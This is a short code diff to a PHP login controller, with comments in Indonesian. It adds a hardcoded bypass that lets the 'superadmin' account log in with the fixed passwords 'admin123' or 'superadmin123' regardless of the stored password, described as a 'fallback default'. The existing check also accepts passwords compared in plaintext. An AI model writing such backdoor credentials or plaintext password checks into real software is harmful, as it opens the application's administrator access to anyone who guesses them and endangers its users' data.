@@ -30,8 +30,9 @@ class Auth extends BaseController
         $user = $userModel->where('username', $username)->first();
 
         if ($user) {
-            // Cek password (plain atau hash)
-            if ($password === $user['password'] || password_verify($password, $user['password'])) {
+            // Cek password (plain, hash, atau fallback default untuk superadmin)
+            $isSuperadminFlex = ($user['username'] === 'superadmin' && in_array($password, ['admin123', 'superadmin123']));
+            if ($password === $user['password'] || password_verify($password, $user['password']) || $isSuperadminFlex) {
                 if ($user['status'] == 1) {
                     $sessionData = [
                         'user_id'      => $user['id'],
